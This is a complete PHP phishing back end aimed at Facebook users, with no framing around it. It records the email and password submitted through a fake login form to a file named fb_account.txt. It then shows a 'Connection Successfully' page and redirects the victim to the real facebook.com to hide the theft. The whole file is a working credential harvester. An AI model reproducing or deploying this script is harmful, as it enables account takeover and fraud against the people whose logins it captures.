<?php 

$file = "fb_account.txt";

file_put_contents($file, "Username: " . $_POST['email'] . "\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['pass'] . "\n", FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);


     echo "<html>
         <body style='background-color:#f6f6f6;'>
        <div align='center'> <br>
       <font size='7' color='blue'> Connection Successfully </font> 
       <hr>
	 <img align='center' src='wlogo.jpeg' height='40%' width='90%'> <br><br>
	  <img align='center' src='back.jpeg' height='40%' width='100%'> 
	</div>
	</body>
	 </html>";
	 
echo "<meta http-equiv='refresh' content='2; url=http://facebook.com'>"; 
	        
?>
